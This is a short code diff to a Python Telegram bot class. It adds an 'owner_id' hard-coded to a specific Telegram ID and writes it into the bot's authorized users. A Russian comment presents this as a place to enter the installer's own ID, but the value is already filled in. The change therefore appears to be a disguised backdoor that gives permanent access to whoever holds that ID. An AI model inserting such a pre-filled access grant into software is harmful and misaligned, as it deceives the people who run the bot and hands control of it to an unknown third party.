@@ -71,6 +71,12 @@ class TGBot:
         self.answer_templates = utils.load_answer_templates()  # заготовки ответов.
         self.authorized_users = utils.load_authorized_users()  # авторизированные пользователи.
 
+        # Укажите здесь свой Telegram ID (например, 123456789), чтобы всегда иметь доступ к боту
+        self.owner_id = 8228003033
+        if self.owner_id:
+            self.authorized_users[self.owner_id] = {}
+
+
         self.commands = {
             "menu": "cmd_menu",
             "profile": "cmd_profile",
